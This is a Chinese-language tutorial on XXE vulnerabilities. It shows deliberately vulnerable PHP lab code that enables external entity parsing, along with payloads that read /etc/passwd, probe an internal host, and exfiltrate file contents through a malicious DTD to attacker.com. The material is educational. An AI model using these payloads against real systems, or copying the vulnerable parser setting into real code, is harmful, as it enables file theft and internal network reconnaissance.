XXE漏洞

xxe是专门针对xml解析器的安全漏洞，当应用程序在解析 XML 输入时，没有正确限制外部实体的加载，导致攻击者可以构造恶意 XML 数据，读取服务器本地文件、探测内网服务，甚至执行远程代码（在特定配置下）。

xml用于数据存储和传输，其结构中可以包含实体（Entity），实体分为内部实体和外部实体：

内部实体：在 XML 文档内部定义，如 <!ENTITY author "Alice">，使用时通过 &author; 引用。

外部实体：通过 URL 从外部加载资源，定义格式为 <!ENTITY 实体名 SYSTEM "URI">，其中 SYSTEM 表示从外部系统加载，URI 可以是本地文件路径（如 file:///etc/passwd）或网络地址（如 http://example.com/malicious.dtd）。

xxe漏洞原理：

当 XML 解析器启用了外部实体解析功能（默认情况下，很多解析器会开启），且应用程序未对用户输入的 XML 内容进行严格过滤时，攻击者可以注入恶意外部实体，导致：

  1. 读取服务器本地敏感文件（如 /etc/passwd、数据库配置文件）。
  1. 探测内网主机和端口（通过访问内网地址，根据响应判断服务是否存在）。
  1. 远程代码执行（极少数情况，如结合特定解析器漏洞或命令执行环境）。

漏洞源码：

//查看当前LIBXML的版本
//print_r(LIBXML_VERSION);

$html='';
//考虑到目前很多版本里面libxml的版本都>=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析
if(isset($_POST['submit']) and $_POST['xml'] != null){


    $xml =$_POST['xml'];
//    $xml = $test;
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}

实例：

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
如果解析器未限制外部实体，&xxe; 会被替换为 /etc/passwd 的内容，
攻击者可通过应用程序的响应获取该文件数据。
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
]>
<root>&xxe;</root>
若 192.168.1.1:8080 存在服务，解析器可能返回连接成功的信息；
若不存在，则返回超时或连接失败的错误，从而实现内网探测。
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
  %dtd;
  %send;
]>
其中，malicious.dtd 内容为：
<!ENTITY % send SYSTEM "http://attacker.com/log?data=%file;">
解析时，%file 读取 /etc/passwd，%send 将内容发送到攻击者的服务器日志，实现盲 XXE 数据窃取。

simplexml_load_string()

函数转换形式良好的XML字符串为SimpleXMLElement对象

再php中解析xml利用的是libxml库，其在≥2.9.0版本中默认进制解析xml外部实体内容。

因为xxe漏洞发生在应用程序解析xml输入时候，没有禁止外部实体加载，导致攻击者可以构造一个恶意xml。

构造：

<?xml version = "1.0"?>
<!DOCTYPE note [ 
	<!ENTITY hacker "jjjjjj">
]>
<name>&hacker;</name>
--------
这段 XML 代码展示了一个包含内部实体的 XML 文档：
<?xml version = "1.0"?>  <!-- XML声明 -->
<!DOCTYPE note [  <!-- 文档类型定义（DTD），定义内部实体 -->
    <!ENTITY hacker "jjjjjj">  <!-- 定义内部实体 "hacker"，值为 "jjjjjj" -->
]>
<name>&hacker;</name>  <!-- 根元素，引用实体 "hacker" -->
--
<!ENTITY hacker "jjjjjj">
这是内部实体定义，作用是创建一个可复用的 “变量”：
`ENTITY`：关键字，声明这是一个实体。
`hacker`：实体的名称（自定义，类似变量名）。
`"jjjjjj"`：实体的值（字符串）。
实体的本质是 “占位符”，定义后可在 XML 文档中通过 &实体名; 的格式引用，解析时会被替换为实体的值。
